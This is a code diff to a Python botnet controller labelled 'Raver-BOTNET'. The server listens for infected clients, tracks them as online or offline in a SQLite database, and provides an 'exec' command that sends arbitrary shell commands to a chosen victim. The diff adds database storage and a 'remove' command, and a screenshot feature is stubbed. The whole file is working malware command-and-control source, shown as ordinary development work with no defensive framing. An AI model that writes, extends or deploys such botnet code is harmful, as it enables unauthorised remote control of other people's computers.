@@ -30,26 +30,63 @@ def Clear():
 
 host = "0.0.0.0"
 port = 5100
-clients = []
-offline_clients = []
 lock = threading.Lock()
-connection = sqlite3.connect("database.db")
-cursor = connection.cursor()
+conn = sqlite3.connect('clients.db')
+cursor = conn.cursor()
+active_clients = {}
+
+def create_tables():
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS clients (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        ip TEXT NOT NULL,
+        port INTEGER NOT NULL,
+        client_id TEXT NOT NULL
+    )
+    ''')
+
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS offline_clients (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        ip TEXT NOT NULL,
+        port INTEGER NOT NULL,
+        client_id TEXT NOT NULL
+    )
+    ''')
+
+    conn.commit()
 
 def handle_client(conn, addr):
-    with lock:
-        clients.append((conn, addr, client_id))
+    client_id = str(uuid.uuid4())
+    active_clients[client_id] = conn
+    save_client(addr[0], addr[1], client_id)
     print(f"[+] Connection {addr[0]}:{addr[1]}")
     
     threading.Thread(target=listen_client, args=(conn, client_id), daemon=True).start()
 
-def remove_client(conn, addr, client_id):
-    with lock:
-        for c in clients:
-            if c[0] == conn:
-                clients.remove(c)
-                offline_clients.append((conn, addr, client_id))
-                break              
+def save_client(ip, port, client_id):
+    with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
+        cursor = conn.cursor()
+        cursor.execute('''
+        INSERT INTO clients (ip, port, client_id)
+        VALUES (?, ?, ?)
+        ''', (ip, port, client_id))
+        conn.commit()
+
+def remove_client(client_id):
+    with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+        INSERT INTO offline_clients (ip, port, client_id)
+        SELECT ip, port, client_id FROM clients WHERE client_id = ?
+        ''', (client_id,))
+        conn.commit()
+
+        cursor.execute('''
+        DELETE FROM clients WHERE client_id = ?
+        ''', (client_id,))
+        conn.commit()
 
 def repl():
     while True:
@@ -57,7 +94,7 @@ def repl():
             line = input("(Raver-BOTNET)> ").strip()
             if not line:
                 continue
-            parts = shlex.split(line)  # respeita aspas
+            parts = shlex.split(line)  
             cmd, *args = parts
             func = COMMANDS.get(cmd)
             if func:
@@ -80,44 +117,61 @@ exec - Execute a command in a client
 
 screenshot - Take a screenshot
 
+remove - remove a client
+
 exit - Quit the program
 --------------------------
 
     """)
 def cmd_clients(args):
-    with lock:
-        if not clients and not offline_clients:
-            print("No clients")
-        else:
-            print("Online:")
-            for i, (_, addr, cid) in enumerate(clients):
-                print(f"{i+1}. {addr[0]}:{addr[1]} | ID={cid}")
-            print("\nOffline:")
-            for i, (_, addr, cid) in enumerate(offline_clients):
-                print(f"{i+1}. {addr[0]}:{addr[1]} | ID={cid}")
+    print("Online Clients")
+    with sqlite3.connect('clients.db', check_same_thread=False) as conn:
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM clients')
+        online_clients = cursor.fetchall()
+        for client in online_clients:
+            print(f"{client[1]}:{client[2]} ID: {client[3]}")
+
+    print("\nOffline Clients")
+    with sqlite3.connect('clients.db', check_same_thread=False) as conn:
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM offline_clients')
+        offline_clients = cursor.fetchall()
+        for offline_client in offline_clients:
+            print(f"{offline_client[1]}:{offline_client[2]} ID: {offline_client[3]}")
 
 def cmd_exec(args):
     if len(args) < 2:
         print("Usage: exec <id> <command>")
         return
     target_id = args[0]
-    command = " ".join(args[1:])  # junta o resto dos argumentos no comando
-    with lock:
-        target_client = None
-        for conn, addr, cid in clients:
-            if cid == target_id:
-                target_client = conn
-                break
+    command = " ".join(args[1:]) 
+
+    target_client = active_clients.get(target_id)
     if not target_client:
-        print(f"Client with ID {target_id} not found or offline.")
+        print(f"[!] Cliente com ID {target_id} não está conectado.")
         return
+
     try:
         send(target_id, command, target_client)
     except Exception as e:
         print(f"[!] Failed to send command: {e}")
 
 def cmd_screenshot(args):
-    pass
+    print("Still being made")
+
+def cmd_remove(args):
+    if len(args) < 1:
+        print("Usage: remove <id> ")
+        return
+    client_id = args[0]
+    with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+        DELETE FROM clients WHERE client_id = ?
+        ''', (client_id,))
+        conn.commit()
 
 def send(target_id, command, target_client):
     target_client.send(command.encode())
@@ -130,7 +184,12 @@ def listen_client(conn, client_id):
             if data:
                 print(f"[<] Mensagem de {client_id}:\n{data}")
         except ConnectionResetError:
-            print(f"[!] Cliente {client_id} desconectou")
+            print(f"[!] Client {client_id} disconected")
+            remove_client(client_id)
+            break
+        except KeyboardInterrupt:
+            print(f"[!] Client {client_id} disconected")
+            remove_client(client_id)
             break
         except Exception as e:
             print(f"[!] Erro ao receber mensagem de {client_id}: {e}")
@@ -141,12 +200,14 @@ COMMANDS = {
     "clients": cmd_clients,
     "exec": cmd_exec,
     "screenshot": cmd_screenshot,
+    "remove": cmd_remove,
     "quit": lambda args: (_ for _ in ()).throw(SystemExit())  # lançar SystemExit para sair
 }
 
 if __name__ == "__main__":
     Clear()
     RaverText()
+    create_tables()
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         s.listen()
@@ -155,5 +216,4 @@ if __name__ == "__main__":
         threading.Thread(target=repl, daemon=True).start()
         while True:
             conn, addr = s.accept()  # addr = (ip, port)
-            client_id = str(uuid.uuid4())
             t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
